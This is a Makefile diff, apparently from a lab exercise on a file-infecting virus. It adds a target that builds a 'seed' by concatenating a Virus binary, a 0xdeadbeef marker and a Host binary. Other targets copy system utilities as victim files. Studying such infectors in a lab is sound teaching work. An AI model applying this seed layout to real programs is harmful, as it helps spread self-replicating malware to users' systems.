@@ -4,7 +4,7 @@ LDFLAGS :=
 
 SRCDIR := .
 
-all: ResetVictims Host Virus
+all: ResetVictims ResetSeed Host Virus
 
 ResetVictims:
 	rm -f ./victim1 ./victim2 ./victim3
@@ -12,6 +12,12 @@ ResetVictims:
 	cp /usr/bin/wc ./victim2
 	cp /usr/bin/file ./victim3
 	chmod ugo-x ./victim1 ./victim2 ./victim3
+
+ResetSeed: Virus Host
+	rm -f seed
+	cp Virus seed
+	bash -c "printf '\xde\xad\xbe\xef' >> seed"
+	cat Host >> seed
 
 Host: $(SRCDIR)/host.c
 	$(CC) $(CFLAGS) -o Host $(SRCDIR)/host.c $(LDFLAGS)
